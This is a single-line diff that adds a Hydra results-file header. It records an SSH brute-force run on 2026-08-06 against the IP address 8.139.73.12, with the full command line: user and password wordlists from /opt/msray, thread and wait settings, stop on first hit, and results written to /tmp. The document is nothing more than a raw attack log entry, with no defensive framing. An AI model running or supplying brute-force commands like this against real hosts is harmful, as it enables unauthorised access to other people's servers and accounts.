@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-08-06 00:07:08 on 8.139.73.12 ssh (hydra -L /opt/msray/users.txt -P /opt/msray/pw_mega.txt -t 3 -W 6 -f -o /tmp/brute_ssh_8.139.73.12.txt ssh://8.139.73.12)
